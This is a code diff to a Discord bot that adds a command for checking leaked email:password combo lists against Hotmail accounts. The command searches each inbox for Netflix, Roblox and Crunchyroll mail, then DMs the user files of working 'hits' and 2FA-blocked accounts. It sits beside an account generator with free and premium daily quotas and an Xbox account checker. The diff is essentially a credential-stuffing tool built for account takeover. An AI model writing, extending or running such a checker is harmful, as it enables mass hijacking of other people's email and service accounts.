@@ -9,7 +9,7 @@ import threading
 import config
 from checker import check_accounts
 from gen_manager import GenManager
-
+from hotmail_checker import check_hotmail_accounts
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -297,6 +297,107 @@ async def cmd_setprem(ctx, n: int = 0):
     gen.set_premium_limit(n)
     await ctx.send(embed=e().add_field(name="", value=f"Premium limit: `{n}/day`"))
 
+# ── Hotmail inbox checkers (netflix / roblox / crunchyroll) ──
+
+SERVICES = {
+    "netflix": {"keyword": "netflix", "label": "Netflix"},
+    "roblox": {"keyword": "roblox", "label": "Roblox"},
+    "crunchyroll": {"keyword": "crunchyroll", "label": "Crunchyroll"},
+}
+
+@bot.command(name="check")
+async def cmd_check(ctx, service=None):
+    if not service:
+        em = e()
+        em.title = "Available Services"
+        svc_list = "\n".join(f"`{k}` — Hotmail inbox check for {v['label']}" for k, v in SERVICES.items())
+        em.description = f"Usage: `{config.PREFIX}check <service>` + attach mail:pass .txt\n\n{svc_list}"
+        return await ctx.send(embed=em)
+
+    service = service.lower().strip()
+    if service not in SERVICES:
+        return await ctx.send(embed=e().add_field(name="", value=f"Unknown service `{service}`. Use `{config.PREFIX}check` to see available."))
+
+    await do_hotmail_check(ctx, SERVICES[service])
+
+
+async def do_hotmail_check(ctx, svc):
+    raw = ctx.message.content.split(None, 2)
+    raw_text = raw[2] if len(raw) > 2 else ""
+    accs = [l.strip() for l in raw_text.replace(",", "\n").splitlines() if ":" in l.strip()]
+    for att in ctx.message.attachments:
+        accs.extend([l for l in await fetch_lines(att) if ":" in l])
+
+    accs = list(set(accs))
+    if not accs:
+        return await ctx.send(embed=e().add_field(name="", value="No valid email:pass combos provided.\nPaste them or attach a .txt file."))
+
+    tc = min(max(config.MAX_THREADS, 1), 30)
+    label = svc["label"]
+    msg = await ctx.send(embed=e().add_field(name="", value=f"Checking {len(accs)} accounts for {label} ({tc} threads)...\n\n`{bar(0, len(accs))}`"))
+
+    stop = threading.Event()
+    active_stops[str(ctx.author.id)] = stop
+    t0 = time.time()
+    last_edit = [0]
+
+    def on_progress(done, total):
+        now = time.time()
+        if now - last_edit[0] < 3:
+            return
+        last_edit[0] = now
+        sec = now - t0
+        cpm = round(done / (sec / 60)) if sec > 0 else 0
+        em = e()
+        em.description = f"Checking {label}...\n\n`{bar(done, total)}`\n\nCPM: {cpm} | {sec:.1f}s"
+        asyncio.run_coroutine_threadsafe(msg.edit(embed=em), bot.loop)
+
+    results = await bot.loop.run_in_executor(
+        None, lambda: check_hotmail_accounts(accs, svc["keyword"], tc, on_progress, stop)
+    )
+
+    active_stops.pop(str(ctx.author.id), None)
+
+    hits, twofas, customs, fails = [], [], [], []
+    for r in results:
+        caps = " | ".join(f"{k}: {v}" for k, v in r.get("captures", {}).items())
+        line = f"{r['user']}:{r['password']}"
+        if caps:
+            line += f" | {caps}"
+
+        if r["status"] == "hit":
+            hits.append(line)
+        elif r["status"] == "2fa":
+            twofas.append(f"{r['user']}:{r['password']} -> {r.get('detail', '2FA')}")
+        elif r["status"] == "custom":
+            customs.append(f"{r['user']}:{r['password']} -> {r.get('detail', '')}")
+        else:
+            fails.append(f"{r['user']}:{r['password']} -> {r.get('detail', 'fail')}")
+
+    sec = time.time() - t0
+    cpm = round(len(results) / (sec / 60)) if sec > 0 else 0
+
+    re_em = e()
+    re_em.title = f"{label} Check Results"
+    re_em.add_field(name="Total", value=f"`{len(results)}`", inline=True)
+    re_em.add_field(name="Hits", value=f"`{len(hits)}`", inline=True)
+    re_em.add_field(name="2FA", value=f"`{len(twofas)}`", inline=True)
+    re_em.add_field(name="Custom", value=f"`{len(customs)}`", inline=True)
+    re_em.add_field(name="Failed", value=f"`{len(fails)}`", inline=True)
+    re_em.add_field(name="CPM", value=f"`{cpm}`", inline=True)
+
+    files = []
+    if hits: files.append(txt_file(hits, f"{label}_Hits.txt"))
+    if twofas: files.append(txt_file(twofas, f"{label}_2FA.txt"))
+    if customs: files.append(txt_file(customs, f"{label}_Custom.txt"))
+    if fails: files.append(txt_file(fails, f"{label}_Failed.txt"))
+
+    try:
+        dm = await ctx.author.create_dm()
+        await dm.send(embed=re_em, files=files)
+        await msg.edit(embed=e().add_field(name="", value=f"Done. {len(hits)} hits / {len(twofas)} 2FA / {len(fails)} failed. Results sent to DMs."))
+    except Exception:
+        await msg.edit(embed=re_em, files=files)
 
 
 @bot.command(name="stop")
@@ -335,6 +436,11 @@ async def cmd_help(ctx):
         f"  {p}xboxcheck + .txt      Check accounts",
         f"  {p}xboxhelp              Checker help",
         "",
+        "CHECKER",
+        f"  {p}check netflix + .txt  Netflix inbox check",
+        f"  {p}check roblox + .txt   Roblox inbox check",
+        f"  {p}check crunchyroll     Crunchyroll inbox check",
+        f"  {p}check                 List services",
         f"  {p}stop                  Stop running task",
         "",
         f"Free: {gen.free_limit}/day  |  Premium: {gen.premium_limit}/day",
